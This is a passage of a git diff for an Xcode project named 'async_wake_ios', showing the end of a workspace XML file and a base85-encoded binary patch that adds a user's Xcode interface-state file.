+   <FileRef
+      location = "self:async_wake_ios.xcodeproj">
+   </FileRef>
+</Workspace>
diff --git a/async_wake_ios.xcodeproj/project.xcworkspace/xcuserdata/ianbeer.xcuserdatad/UserInterfaceState.xcuserstate b/async_wake_ios.xcodeproj/project.xcworkspace/xcuserdata/ianbeer.xcuserdatad/UserInterfaceState.xcuserstate
new file mode 100644
index 0000000000000000000000000000000000000000..ec6e33b9b1477f1eb3d0acd27979735bcdb7f8fd
GIT binary patch
literal 576537
zc$^H#Wk4DT!vJ6qP(d0cL@cl{0BKMJY(=FlL=XdzPy`h8*4@2ZhwJX%-gUT++iu<6
zyLEow^YdxyaM-%MOy(5;5D)?Y0l)wVAaovf9<GMwZ}D{5+^!m$yUE^S@pjeH%pQx?
z_W!M=dEFgY0C3dejhN&CKo}q#Kn2hMNq}TP3Lq7b2A~7d0U3ZyKrTQ6$OA|LGJqVA
z4=4sy0-6CWfL1^ozzVPd?0|NF1K<P<2aEuW1dIZV28;oW1&jlX2TTCW04xTq0jvdV
z2J8gv0_+Ct2OI({0vrY$2b=&504@M70{#J92iyTX06YP_0K5ad2Ydm11%?1YKrj#j
zgaXOH7$5~03ycHC0~3IWKq`<6<N^6W0Z<4O0mZ-^U@lMs%mYe+CBRZ(8L$Fa2~+{A
zfek=2umxxX+JP>h8`uH#0|UT5;1J+Y;4t7M;AG$w;8fr=;6mUc;9}qs;8I{ea0PH3
za6NDfa363#@Br|Cz=Oa;z|+7pz_Wk_zze{uz-z#p!27@lz^B0Xzz@LxfWLshfqz0E
zA+V6hkf;!RNPI{_h%iJHA`Zz3$qkW&<b_B>WFhj9{18ouHbfVq52+5R38@XSgfxe=
zgtUg(L)t^!Asr!|A)b&CAtOUZg^Ugv6EZerT*&y42_ch17KJPhSrW1|q(5X?$nuc2
zA?rf6glrAj8?rBCf5?%LQz7R={t3AmayR64$eWP2A@4%ohkOb78uAkq0tyAeL1+*L
zgau`QGC^4&28an_fwDnt5C_Bs@j!f#03-%UKvGa6s2$`0IYBOv8{`EI0}Tg_0Zjr;
z22BSo0`-H|fYyRGfHs0Qfi{D-fDV9;fCfOPL6<>SK>vasfu4chfZl>Wfc^u01bqU1
z28V#dz(_C(j0Y3IWN->N9n1hT!E7)G%mwqnd~iOv1Y8AHg7x5Pa6PyU+z$4DyTE>M
zH@F8J00+UNz~jJE!PCIAz)Qg^!0W*4!JELF!CSyv!P~$G!N<U-!Dql1!I!{S!4JSs
zz%Rfr!EeBC!SBHD!5_fCAs`480)wC+Xh<X^9zuhpLed}^kW5GxgaKhfav(BDF{A{d
zfK)(KkOqhu(gJCP*dTUDJH!ETLIRLMkP(oPka3XlkjapFkVTMw$TG-E$STNc$QsC6
z$WF*U$YID4$Vtd4$XUpB$Zg1d$OFh@$P>s@$TP@u$S276P(Ua!6cQR53Jb-DMu*0R
z#)T$^QbTE>NukN1*`fSUNoZbZerQ2xNvJloCe#qx5NZlFhc<;;LYqT7LVcmVp?#r4
zLWhQq44oP}GjvYq+|UJ~3qu!$E)HE1x;}JE=&sP+p$9_$7kVW0eCXxSYoY&!-VD7J
zdOP$^=-tqlp|3*Ug?<eE6#6X;5(W)JgdxK)Vc0NSSY%jKSVCBGSVmZ87%MD0j29*k
zD+((MD-Wv-s|r(wslwD@#xP5mEzBO~3Uh~bg$)iH9yU5`OxXCa31Jh%CWTE7n-{h?
zY-QN0u=QaZ!nTAR2s<2hJnTf+K-lT9Ght`L&V}6wyBqd6>`B;*u$N(P!+wPQ2?vFP
z!^6VE!=d4@@Q83icuaU=I5j*aJT*KcTo9fUE)AE37lapv7ljvxmxOD>Yr`AEP2nx!
zt>N}?e|Ru_Q25~RVd2BWM}&_I9~C|=e0KPP@P*<1;mg8Tg>MVr6}~TgfB3=hL*a+R
zkAxo$zYzXU_|5QJ;rGKIgg*)Y5dJy*d-#v=-{F6t04NX|0!2b`Py&<)je*8PGoVZ;
z2g-#CphBn!Du(7jOQ5CDN~jL1ht@+4P!rSv?ST5B-OwPk7upB?3pxlo4mt@s13D8r
z7rFwv2D$;d5xNDs6}k<25PB3k06h&o2R#qH0KEvk1ib@&2z?HH0euU72mJ&C!XPjx
z3<g8MkT4XC42y$NVKi6@EESdpqr=i+e3%#}gUMk<Ff~jMYk(PHW>^!<0&9k~z??7_
z%nj>>^}+sv4T24Z4S@}XO@z&W&4kT?&4tZ_ErP9ut%I$HZGdfrZHMiE?Sbuuorax(
zorRr)orhh3U4&hNU4#7#yAHbrdjWe1dj)$9djoq5`vm(2`x60*h=_nkAR=%PqzGyR
zEg~s`5y6aLMTjGEB61@NBZ?x5BT6ES5seY12y;YJge9Umq9vj=qAkJ~;g9H!=!pnK
z1S5t-jEEQ+F*#yN#MFps5wjxZM9hsi8gVk>RK(eca}k#!E=OF8_&4HK#O;Xt5f37s
zL_Cdn8SyIOUBvr{PZ6IZzDN9s_yY&P!Egv13Wvdwa1<N|kAxH9Bsc{g3r~bo;c0L>
zJRQ!0XT#ZWAzTEP!e#JccnQ1`UIkae_3&zV1KbF2hPS}m;SRV5-USc9gYaJXQ1~$T
z82DKDWcU>LEck5r0{BAsGWc@%TKGEn7WfYMPWTb{QTQ?Varg=NS@=2lW%zCQ9r#`N
zJ@|e21NbZWYxo=Z2l!X`H~4o%2m*uvBOr)SL<9nbARx$y7(_fG0g-}8MPwj22mvAo
zAwv`+N)QT!8lgqZMJz-tLi8h+Ayy$)Bi17}Ahsa3B6cEnA@(8mBMu=BBaS0ZAWkFB
zATA&-BK|>KMchE#MBGK(Lp(w}Mm$HnK)gY`Mf`{Oi1>>5hWLf}jSNA8kYUJhBpiuA
zVvtxQ9!Wrwkuk`4WCAh?nT(_((~%4$6UjkxkwT;hsX$gBE0I-5B~pb{BQ;1Z(tvD0
z8j+32PNWCfh4dnQNI$Y0*@Fxqha!hTenF=qha+bqXCY@J|3=P1&PC2c&POgoE=R6F
zu0*avu12mwu0^gx9zgyNc@TLBc^G*Fc@%jJc^r8Hc@lXFc@cRDc^UZ_`2_hC`3(6S
z`2zV8`3m_O`3d<M`33nE`3?CU`2&SOAyFt48ihe&Q8>_YR3s_}MM1?vU!meqEL1j%
zjpCrVC?1Lr8ix{~q$n9m4tApQQ96_!RgJ1a)uQT9^(X_X8F~WMg6c-~paQ5Msu$IV
z`U^D(H3~HvH3l^oH4il(wE(pcwFtEswFI>qwFb2owGMRv^*_`>)FISi)DhHC)G^d?
z)H&37)CJT<)Fsqq)D_ed)Kk<m)N|Ae)JxPW)N9lm)MwNe)K}Cu)OXYm)K4@LjY6Z*
z7&I1*Lr0>c(0DWfO+=H>3Ft&L70pHS(0sH2EkujZVss8V7hQ-h3KgP@(Y5G0bUoUD
zZa^E+jc60vingKc=ytRN?L-eo4?zz_4?_<}k3f$^k3vsEPexBcPeu2mm!X%VSD;s-
zSD{y<*Pyqcx1zV9x1&#>Pohtu2hgX{XV7Os<I(5PSJBtd|Dvy>U!q^3U!&ik-=g24
z-=jaEzoUPkf1-b3P#81@gTZ2Om`F?%29F_N;xO@;1WY1^ilJeWFv%DJMu-t%#F!jR
zE=GdM!xUpmFr}C>i~-YtF=84qCX5-=gt1`SF%HZi%wWtA%uviQ%y7&I%t*{c%p}ZW
z%o5B}Oh0BBW;tdBW+i4LW)o&JW((#h<{0KU<^<*><`iZCs>YngT*h3%{DZlQxrTX;
zd4YL}d4+k6d4qY2d58Im`G)z9g<}y|Bo>85V=-7P7Ke?*Mq%;TSZo|N9-ED2V>wtZ
zmWSnI1y~_ggq36Su?5&dY!S8wTZ^s3)?*FW2CNa=h;74Ku{Nw7+lT!NI|w@%I|Mrv
zI}EJB4#$qiPQXsYPJ-27Cu5gjmty;|%dpF_E3hlEtFWuFo3UH4N3qAS$FV1{C$Xon
z1K88pGuX4(f3R1v*RapAFR(AMuduJNZ?JE%@38N&->~1YKd?Wszp%e?U>pP&ii^gP
zaWOawE*2Mui^nD45^+=<4VQ#V#--p`xNIC7$HC>`ig3la5?m>+3|Ed*;Pkj^Tn(-X
zXTde&TsSw*gByk$jvIj+i5rC*hnonUj+=y=i(8CahuehPk2{1rjJt%pjJtyS2X_^B
z4fikZChk4%1MWZEN8BgeXWSRuSKK$;_eek_Ffud}9f^q~N3tTbBiWIhNNyxAk{>CE
z6h?|7%OcAo6_FK@m627E%1BLQO=N9kU8Ez@8R?32M|MPZMtUN<BK?uWB8Nwgh#VO?
zDspt>#K=jJ(;}xwu8-UhxiNB6<mSjNky|6TMQ)GW5xFyRSLE)<eNn8a+$c#@epGQ(
zNt7b0BC0Z~DoPX87-flSi?T-9qU=%5s6f=9s9{mVqee%Ki5eR<E^1QL+^B_7OQZUu
zmPIX(S{1b|YIoHBr~^@lqmD!!jXD-}D(au8>ruC(?nK><x)=2@>TT4=sIO7qqJBmF
zj{1WK;K6t_J`zvFlkm}aGCmeh$20J3JO?kp3-Kbn7@vnP$5-Jscr9Ls*W+vPEqFWL
zg?Hn-@Ls$R@5cx6qwwSKlkk)AQ}9#qGw_S?%kiu6Yw#QJ8}Xa)oAKN6hw#Vnr|<*#
z)A%#^^Z1+iyZDFrNBGD1C-@im&-m~7-}pZS00Bq<6VQYx0*Me!h$X}k;t2_aBm#@T
zB?t*3f|!s)$Rm^!lmsn7N2n##5$XvBf{EZDbP&7*AHh%PCIkti2;&Kp2~!9&2r~(@
z2(t<E2rCI|2^$HU2%8C82-^vV2*(KngwurcgbRd=giD00ga?EtgcpRDgja;ugm;9W
zL?97D3?;&d5kxo<LBtR#!~|jzF`1Y`OeLlh`NSNelqe$>5{rn%#1f){SVJ@rO++)X
ziD)6V5<SFjVlT0eID|NqIE*-)IGQ+}IGZ?+IG?zHxRAJnxSqI$xP!QpxR<z(xSx1{
zc$j#Oc!_wGc#Zfk@jCGq@fq<o@jdYa@iXxY@hkBg@fQh7LXa>dED1-7BoRnd5{;Bf
z${=NuvPcXPo0Lb&Cl!-QNTsAQQU$4&WF$3_ETlG)m1HB?NiI^5G>9~eG@LYoG?Fxi
zG=nsUw1Bjbw3O6OT1Hw<T20zc+D+O|Izaj#=^*I{={)HQ>0i=y(rwZm(p}O$(j(G4
z(nr!)(l^p~(ht(_Xjn8V8W$ZIO^hZ*M@N&R<D%1}8PV)$PBb@~7cGn~j4q3=jIN5-
zL~EmU(fa7R=+<a^v@6;j-4Wdx?TsE1Ju-T1^tk9r(UYU6M9+v`9K9@hRrKoUHPLIM
zH$?A=-W&bD=ws2xqX(j|M&F3O7kxkaQS{^JC(%!%pGAL+{ze9nf#gtf7#U6`l4Hn;
zWGXqCoI*||bI1a+gq%l~lk>?1<U(>0SxwfEtH}*yBe{`mA~%ye$X;@g+)M5w|3w}`
zo<N>To=yInJfFOPypX(z+)v&}-b&t0-b3C?-bel)`84@F`5*FC@-_0m<Xhxt<X7bP
z<PYTk$REjHVn8urF^Cvs3@Qd46B!d9LyMuuq{n2$WX3RKa$=-0MKQ%OB{8Kj6*09j
z4Ke1JrWi|1b4*)IS4>aL;FuvXBVtCzjEWf@Gd^Z^%)FQ-F-v3mW0u9NjM*BqE9OAV
z|6-2B9E~{^b3A4s=4#B1m^(3dWA4S=k9idHF6Lv*_n03sKVyDTfD{A;Lm^T~lxPZ>
z5=)^|vM3x1m%^j)DPl@7rJPblQBqVCHAP1;Q(7qP6bHpgaZx;!L6l*XQIye?F_f{C
z36#Gn^C?Ry{gh>t<&@Qw?Udb=|4|N74p9zMj!`aBu2ODMZd2}49#9@q9#NiAK2p9?
zepCL$0%C!&;8=8QWNdUSIW{Ji5}Od48Ow_0#|mPFv7*@A*wWa_SZ%B>wl=mdwm#Mn
zYl?NmcEtK)yJLG|1F?OvV`3-9PLG`t`*-Y|*txOuVi(1(jolc#J$6Uz&e&bCdt*<;
zo{7B_dpY)6?7y+sV{gRXiG30KCiX+@f3Y89KgE8H1IIz*P;uzE$hfFDd>kQ;9G4Q8
z9><7d#<AkE<G69MxT3g<xXL(noF+~ir;DqNYl*YPIpbV$?zoP)uDHQ*BjU!zjgOlg
zHzjUr+_bn^aZBS?#I1>28@DcQecYzFeQ}54PQ;yzI}>*{?p)lZxI1wV;-1Alk9!gK
zGVV>>_qgBj;CM)UXna_FL_8s$9G?)M7*CC-#izux<N5Kq@sjwwcxik=yfR)JUl(5=
zZ-{S*H^n>RJL3KE-SIu~f%w1T$Hq^LpBg_cetP_j_}TIO@vGuD#&3$>5x+BjSN!hy
z{qd*b&&FSlzY_mX{MGpD@sHzQ#J`JwAOAW2OZ?aPZ}Gnppb3ZsOae9mmk^miNT4R9
zCS)Zr5;zIm1YQC^L7Y&WP@bSlP$y^-v<cM-mIP~pE5V)MP4Ff76S@<66GkVDPneo8
zEn#}XjD*<<{RyiQ)+cO8*pjd{VOzrXggptz69y74BwS3mlyEuWYQlqrCkd|-UMIXs
zc$@Gc;dde^5t;}~L?)sV(TSMEsKkWCq{OsDdSZHFMj|6ooG48!N-Rz+PgEpUBvvM>
z6OD;YiPl70qCK%a(UllX9Go~Zaa7{?#0iNL6DK83OI(<^G;u}Z%EVQPs}t8H?n>OB
zcqH*?;;F=e#M6mq5-%j)O1zi&DDiRPlf<WqFA_f|{-6S=Kx!y8j2cdbQV~=Vl|oIV
zQmHg*5;c{|p$e$ER0%bYDy0@sl~gUYj#^JOP#dTws)O1=^-=xQZfXy;k2;1rfjX5s
zjXIq=gF2hqPhCY_Pu)P>O5H}?PTfJ>Lp@F%pkAb2qF$z6p<bgtq&}s-qQ0iSp}wX5
zNBu(s(V#RKErJH8p=e}UJS~ZqOrz7%X&JOk8jF@olhF!kMYLjC39Xz~O{=GwX-zZ>
zt(j(}d1*bg!L%W?p|oMNk+i9_S+x1I1+=BKe%dnHa@uOzcG_;*0owm)2Wf|BM`;&m
zS7<kAH)*$Mw`mV(Z)hKApJ`ucUuoZHKa;|f5J}i1ToNIPm_$m7PNF2GC1oXXlDJ8t
zBymzsQf`tgsUk_0q))0&s!6I%G9+1(oJn0t-lU$SKvFQNH)(Lv_@v26)01W-%}kn=
zG$(0!(wd}ANt=_lC+$eunY1fuU((5>Gf5YcE+$<{x}0=1=|R%dq}NGrl0GE;m-I2|
zQ_{C&NHR1Tk&H}6C8LvZ$#KcFWO{OXG9#Ip%u3Eq<|WIMi;~Nd%aaw!70JqEL$W!!
zE!mpvNOmT>lHJK&$%B)JCy!1ZlRP$gT=K-^Imru>mnQcoFH2sYygGS%^6upSB_B*a
zlzce(Sn|c>f0Az|-%7rnd?)!q@|)xj$zPMdC4W!;k^DOamV!))Oo>Xtrw~%eDJd!G
zDU1|m3M(Z$g_|NvDN0eKRHUd<)G3-2ZAwi_bBZ;^mEun6Na;-RrVL3LnKCYAe9DxR
zsVUP^rl-tK=}%divNmO1%KDTIDVtOFryNc>k#aKSY|6Qm^C=fnuB6;cd6e=j<$21B
zl$R-QQog7BNd>1uQemkPsqj=pDkhbZnvj~5nw*-FnwpxP%1_Nnm8Hs4i&INdOH<2I
zD^u%Ijj2tkmel6dmQ-u1H#LwtD0Oh^h}4m(qf$qwj!&JPIxlr`>XOu@sr{)dQn#e;
zOx>S)AoWP<(bQw9$5RJVucqEey_0%3^<L`z)JLiBQa`4COZ}euBlTw*APt^|PK!*7
zO2elS(xTIn)97i8G-etrEjx{uCQmC$D@!X+Q>0a-DboyTrnKg?mbBJ1dzwEjm^L_V
zNZQb}VQC}Nrl!qIo0~Q-ZGPI~v~_8l(zc~-Pur2UJMCE7skC!x=hH5vT}=BY?S9(h
zwC8Cr(q5*$N_(63Bkd0zOoz}z>0$H;I)P56$I;{I3G_sI5}ifo(Z%!}x{NNT=hF-5
zC3G#lhTcFo(i`a}x`pnhd+9-XFMTk52z@Ah7=09d8hsXhE`1(-K79dwF?}6<6MYAL
zCw&)vH+?_-6#XpyBK;EmGW`nu8vP;t8T}3YE&V_GNBSrFXZrW_&~#WjDjl7UNynx~
zr6;5(r)Q*RrnAzs)7j~qbU}JSdP%w>y&}Cby((RuZcMkNThndn&U9D0JG~>_n?59c
zMEaQYvFYQ|$EQz9pPRlYeR=wd^fl>g)7Pc1Pv4xrKmAbpvGn8VC(=)*pH9D)ek=V!
z`or|6>Ce)ir@u&llm0#ZcScACC<B}U$q3Jg%phgNWyELDGLkZqGg30rGx!<ejJynK
zhAcy#QJA61&}Y<V7&6QmO&OMq<_v3wH=`%xuZ%$%gENL?49}RHF(YGc#=MM08H+QP
zWGu~Ck+CIXN5-Cvy&3y5_GcW-IFoTP<7&pWjGGy^GHz$w$#{_QCgVfK=Zr5IUo*aC
z{LBo`L}cPJBQuGaq|E3{a%OyHMkX_plgZ8GW%4scnMIjpnaWI6raDuTsn2Z6Y|C_J
zx-z>my_vpDe`YXqROYzMNtu%~r({meoRPUWb6Mu<%r%*7GuLHq%G{TEF!N~UvCQL{
zCo%^zuV&uJyqkG1^M2-o%qN*2GCya2&-{`3GxJv#APb&_&cbIAvWQuvEJ{{dR%R9}
zD?5vw#mVAl<!2RVRb*9WRb?r&v{|OC<}6#5J*z#-k>$?n%^I9FB5P#UsI1Xh6SDr!
znxC~eYf0A9tp2POSzEGpX6?(`pLHnfaMqEmqgf}iE@xfKx}9|=>u%P)tjAgJvp!{g
z%le-6BkO0@A4UWN&4^?~F-VMP2AL7Vh-0KPG8mbRECz$YW(XM~hJ;bZsAOmuT1GXa
zhEdC?W7IR+810M>Mkm9^7|IyQ7{?gTn8cXOn8KLKn8sMhSjt$%Sj||^*v;6_ILtW0
zIL<i1ILSE07+_pw++f^e+-E#yyk~r3{9ycK{9yu^KxPON#6&T1Od^xSq%hN%nM^j5
z!{jpsOd(Um6f;YiWz2G>f?2`TFtyAYrjgmiv@pAvUZ#)fXLd7tm;vT+<_P9U<|yVk
z=6L1==0xTK=0fHo=3?d&=2B)qb2W1fa}#qjb2oDj^Dy%W^Az(e^BnUE^9J)C^9l1Q
z^Aqzk^9%DU^BeOI3&aAmU@Rmnl0{_2vl3W|tW;JOOTdz|6f7-E$I`PLEGNswa<e*E
zoh%Qli{)kcSiP)1)-cut))dxKRzGVyYX@s5YZq%bYY%HLYai<<>lo`e>kR8G>oV&a
z>tEI_);-pJ)??Na)(h54))&@S*0*d(c4&53c6c^48<maD#%GhWld_Yunc1vtZnijE
znq8J%o~_H)XV+(&vRktq*&W&5?4ImE_Fvh<vPWf)&Yqq9clMm@x!Low=Vvd-UYxxn
zduR5p?A_UWviD~1%if=TAp3vW$Fh%SpU(a#`)>A^?62A1vcG5l$o`rAEBkl$A2xsu
zWFy!}Hj0gAW7q^XksZUPuo-M7o5jv%v)LRrm(61f*`@3<b~#(Yu3%TPtJrFGHM@pg
z%Qmx{*cP^%-NEi;d)QrUFT0mLm_39&mpzX?pS^&+kiCe#n7xF(l-<u>#$L`|!CuWi
z$-ct=hkb*6hkcj*ko}1LnEizPg8iBOo&B5rhXddMIbaT&6U8BMqB*ggI8Hn#fs@2x
zakv~IN5m0xayWUMa*mRt<>)xIoH|ZD$G|ah9Gni0m*eC3Io+HfXB1~VXEJ9BX9i~`
zXBKBRXC7xIXDw$VXA@^LXA5UL=Md)@=M-mvbDDF8bAfY<bC2_g^O*C5^OW;~^O^I5
z^M?!Ig1HcGC^w87!6k6X+&FGLH-VeTP2#e+Jg$f<=H_vwTp3r+E#j)VdTt%Jo@?MX
za7|nXx0CDR`nf@FFSn2T7k4OkB6lixCU+KhHurDtJnl;FI_@U!X6|<G4(?9wF77_=
zN$wf$1@1-eCGKVJRqg}sQ|?RdEABh)d+rDBf7~xT5HE}u!GrS<JR}dpqwo@W$-ER^
zIxmBl$;;wp^CUbuuZUO7E8&&$6ucT<1JBHB;<fVHcvhZ`=i~)=fANO$hVh2;M({@S
zrt|*h&F3xPE#WQY_4AhTR`Is+cJcP{_VW(#{>MAaJIA}syT<#McZ+wMcZYYE_mKCN
z_aE;I?<?;c?>p}oAIgXEk$fy4$B*Pk@k#t7ei}cMpT%eJnS3@sk6*wq;g|9&_?7%B
zzLKxyoA}LqE8oVq^V|6@evm(yKb${;KZZY+KaM}1Kbb#|zlh(@U&dd~U%_9^-_GB|
zKfwPV{|Nsm{}}%`e}I3Le}jLAf0uucf1m$||BnBO|Be5h|C|3u01yBL5CKLIB_Ii+
z1!O^tAWo1jU<x<_u0SXd3B-aNfmEOnC<R)9PM{Z53+e=|f_8yh&>`>&d;-6qThJ>Q
zEf_DDESMsgDwrmiDOe&{Ay^|=E7&O5B-kw2BG@4~EI2M05S$jA5u6oV5Zn^n7d#d`
z5xfw*6uc6=7Q7ey5(0$~VW==n7%q$u5`;0rcwvGtNti555vB|ILa{JUC>6?ta$%uR
zB~%Nmh4n&%&?Gbqn}il&o3KmRE$kKc3I7rf5)Ktk6iyY+6wVUP7XB?<AY3h6FWfBL
zBHSw6Cfq4JB0M2HEj%MUD?BH>D7-CvAbcWxDtsw?C44P>Bm7VJM+6duiNZxt5ln;-
zkwg?xf+$f$712Z~BDRPx5{q&~xgv>3E~*r%MS4-Ss76#PGKlP=c9BEm6uCrRkxvv5
z4HgX-jS$Tc%@oZN%@+MFnj@MkS|(a9S|M5~S}R&7S})olIw1O==%DD3=&<OB=%{Ew
zbU}1cbX{~;^icFj^g{Gb^jY*%^h+EehKmtmq!=ZR5|hMnVyc)Xri-)0JTYG^5KF`b
z;!1IixJhgmw~HO(VdCN95#o{JQR30!G2*e}apLjfsp4tkzr{<%E5y6R1LD)-Gvc%2
zbK>*j3*w97>*5>Yo8tT82jXYqSK@c#kK#|_Z{qLb-{L<x5jpT2L=Gt@I)|JSlS9d&
z=FoEJIgA`(jwq)fr!c29rz%IAW6WvHvE|rv+&SKyV9t=75jkUWCge=anVK^zXKv2C
zoV7XYa@OZ;$k~{)DQ9!eww!^S(>Z5y&gPuUIiGVO=VH#KoXa`Sb6(`U%z2gbI_FK!
z+njef?{hxne98Hl8<Gpkh2|na=W~&{*j#)rA(xyRpG(W7=cebfa>coMxvE@sZgXx+
zZfkB^t~J+|YtL=Z?aKA$`f_`7hvtsV9h*BbcT(=O+*!G^bNh3b<u1?NoVz7=Ywot(
z?YVn%_vIeSJ)L_d_iFC7+}pW#av$VA%YB{uCHJc&L;{jPB}fTTk|+^L#F89Iu0$fq
zlSm~piCmH|DUfI-I*DFVEvb>zO6nxdk`_s;q)pN;aY&pJmt=@!sAQOAxMYN6q-2z2
zv}BxQu4JBMzGQ)9p=6O{v1Em0on*aayJWxQfaIuTKypEHRdP#mPx40cR`O2rUh+Zm
zRq{>pD-V<xmKUCf%){no<Yne%<uUS@d91wbJa!%@kDJHK<L3$T#CfChrsvJbo0GR7
zZ(-ijy#BnEd0X>#=Izbfm-oNCgL#MY4(A=oJD+zY@87)ZdAIZK<UPoHllLL-bKaM{
z?|DD+e&+qk`z?h@QBs^VQc9GPq!ekIG*ilwW=pwJo|G>YNQKfuX_>TAS|!y;wbB}C
zv(zeeNS)FSX{Xd9?UH(>L!=|6W2NJylcbZS)1`}~{nC}vRnoQ6b<*|H4bqL$z0!ly
zqtav2Q_=zHIq41Q9q9w<L+KOgQ|UA5bLk7|XXy{=9~nRfmO*4tS(J<<qsU@q39>{P
zRYsE~$yhS3Oehn{B(gGDrA#f;$n>&mS&gh#RwrwfwaeVH4w+ZxlLcfWWn*O%Ws_u6
zWz%HSWiw<mWlLl$WNTz=WgBIiWZPs1Wk+QvWv66kWM^gPWaniUWVdAZWshY~WG`ed
zWp8CaWPju!IanSh50^vbFnNTWAdiv9%M;{D@?<$(&XbGe5_z6nF3*=2$P48~a<#l#
zUN1MuO>(omMcyg*$piAB{4e<+`C$1F`B3>p`84?~`E2<-`F#0e`8xR~`8N4>`7Zfx
z`5yUR`9Aqc`C0iz`6c;P`8D}X`BV8z`CIur`G4|{@=x;5@-O+I{P28uJ|Z8JkIl#D
zC*~*T)AQ5wv+^1F%zRdUcD^J(KfgG?BwvwVk*~^c$T#P=<hSPA^6mNU`Hp;Nejq=X
zKPZ1#{_y<K`P1`f=g-TZpT8)7asHD0rTP8&8}qm2@5<kuzd!##{^9&{`Iqvq=3mRd
zk$*G)R{rh$JNYm2-{$|9|1tk-{<r*J1<(RS0j2<35LJLLAQTV_NCim+^n$DcMghBk
zQy?fPC@3jV6jT%_3seQ_0!@Loz*NvuU@Nc}xC-0_T?K;+h8K)37*jC5U_!yff=LCF
z3+5FpE?8EuykK>~nt}}ldkPK|94<IgaJ=9|!O4PC1p@_F3vL$NEx1?ksNh+_$AYf~
zKMQ^p0t$hJA%&nqa3Q)dvM|1oTF5A57v>ep3o8rNg~md2p|h~F@UOxlg%b*=6wWVP
zRJgWqW8vPy1BC;H=L&BW-Y$Gz_`2|0;m@M*B6tz8h+LFXlwQOy5)~B{l@;lWYKvNm
zY(>7Jo}v*&V~S=J%`WOMT3NKUXh+fEqT@xEivB6OU-Y=>ebL8aKry%&U5qP^E2b7R
zinEI)#q#3HVpVZNvANh;+)><DJfwI+@#Nxp#fys97H=rtQ+%L!p!jU@_2S#b&x>Cb
ze=Yu55?&HfLMS1Zq?FK0cqO8eqLR`QT}fR@Yl*GISJG25qGU|TjFQ<U{Us|)wwCND
zIb3qQ<Wk8$CHG4nm%K0eSPCcwm!eB?rE#UyQbuWZsiah1T3M<pZ74ODI!ilB`$~tD
zPAHvRI<It5>Dtl_rF%*bln#`hExlfPr}RbX>(XzfKg+_);AO-za#>1QdKte=R8~}0
zR;DkjEo&*WmHEng%0`rpDVtF?yR5%#W!cuU9c72hj+b33`={)F*^{ylWuMA{<=}F3
zc~p5qIjx*o&Mp_1=alD`mzI~6mzOKbE6OX&tICz-)#df&hVq7TTe-cwz1&gmEbl7!
zmiLqg%Ey+ED<5Azp?qTbr1Ht-Q_5$S&nll&zOsB(`RejD<!j5=m2WBEQNFMIVEM`N
zQ{@BY7s{`e-z$Gn{;~XL`LFWd<$n|?1zLeoU==t;q#{Z|RAea_3Z{ak$X2iw90gaw
zQ}7iPib_S5La9(G)C!G4tI#R*ih6}f(W+=uI2D}=kHW7ADtZ-z6(ba56q6K_6*Co!
z6#a_riW7>Hic^XK#c9PE#aYEU#Z|>M#lMO>ibslPidTwviua07iqDGgiXRnW72y@o
zil_>F1)+jiL8^$Wh_6VhU{o+GL>1x+S%ti!s6tVps;I9pRJ2yKRX8g=6@3+>Di&5O
zs#sjHq+)4Bf5ozj<rOO`R#vR4*j2H+Vo$~1ihULPD-KkgtT<IMP;t8ALdC_3OBI(Z
zu2ej!cv|tS;(5i3ikB6yDqdH-s{~X6D?=(lmEcN9WoRY55>bh(jI4~Qq*TUM(kkhd
z%t~G*zcRN{R#{c4tW;I1D>aq1m35WI%H~RIrK{3Y*;P5Qa#H2w$|;poE2mXXubfdi
zvvOAD?8?6@=Ty$Gd{FtO@@?hE%CD8*Dt}e}t_rC_R$;5~RfMYODsoj!6{RY+ieAO2
zVpnmh1XaSS+^W*5iYir=x=L52ud1%9sj97Nsj^qOs@zpwRo<$esu5LVswPxTteR3a
zwQ5?`^r{(Ei>sDZt*TmGwZ3Y1)&8nORfnsNRUNN7QFXHFRMkIKH>&Pb-K~09^{DDu
z)yJx@RX?kKDFI5LGDHbdf|Y1xl#-;3R>mshlvE`{$yV}}0;O1)qs&!GlzGZ>rBbO?
z>Xfz0I;Bx*SGtrQWtY;g>{j+D1InOslybasvT}-YhH|EIj&iwjwQ{|3gL1QSi*l=S
zn{vDIkn*^4KzUkuUU@-zMR`y8Ncl|pT=`1*TKPu#R{2i(Qw3B(RG})EDnf-)kyUXj
zs*0vcQKhQVRCHCkim%F1NmVjcp{ht#rqZkGR7O>!s!3&0HLF@wttyYITh*)TQw>oK
zRgF|lRn1h*QO#8?P%Ts~QY}_3QLR^PQSDIeRP9ymQyo;DQC(17QT?O(S9M)=Lv>Si
zOZ80kTJ>J_LG@YnMfF1+rjAgf)MzzM9jT5|<JAN;Rh_ENP-m)H>TESnEms$*%hcuS
zN_CZ5saC1gYNOhsZc|&;4z*L=ss2knR6SBXN<CIRPCZ^dK|N7DN4-$JRNb#$sa~aC
zr{1OBr#`4Yq&})XrarDdp+2d;qQ0)at-hmvpnj-+s{T*?Mg2qlQ~gH+&;T_d8juF1
ziPR7^Bn?Fqt4Y*kX|gpu4PPVDh&4HyT#ZCirYYA{X*3$Grbg4Ov1%L|r=~;GsqtvK
zG+xaR%}C8y%{a{@&1B7V%_2>|W~FA8X02wOX1!*EW}{}W=Ah=N=9uP`W<YaJb3=1S
z^FZ@Z^F;Gh^Gx$x^Fs4k^F#AT3($hK5G_<2r6p-8+E{IZHc?B}(zHohmX@a#X~o(+
zZN9cjtI<|#Yqa%RgSJ6y)HZ6{wGM5k)~EGrgW6v0VC{JAWbJhA4DD>~-`Y9ax!QT!
zmD;u1joMAx?b<`yW7<>N0qt4sIqiAvP3>LnL+vB&Q|&YDbL|W5OYIl!PaQx9)IoHi
zx(FRXN7lvZ;&oIVO_!u&>9{(fPNd7#NpyKSsZOS=(5ZAfonBX`Yt`9xE}dKF(RJy(
zI-kz38>Sns8?76!o1mMho1~kjTc}&ATd7;6TdiB8Td&)#+pjyKJE}XTJFXkhUDe&t
z-O=6E-P1kPz16+bebjx`ebfEYL-hzfMvv7;>G67ko~S43lk{|bmY$(!>p6OXzCd51
zSLiGBO1(<2)@$@yy-DA!x9V+rr#_(nOFvXUOg~aTN<UgZMn6_RQ$I()K)+DGRKG#L
zMZZJ8Q@=;QSHDlcUw=S9pg*U-q`$1crhlk^s(-0}rGKk`r+=^ip#M+*ry5)xUJb2A
zR3odg)v?uy)ydT<)%5E0>Wu2l>a1!}bzXITbwPDWb!l})b!~M+wYj>fx~00cx~<w;
zZL9WG2de+79#lQ7dQ$bY>RHvZtLIkFtDaxIpn75Tn(7VJTdKEKZ>!!_eYE;y^_l9k
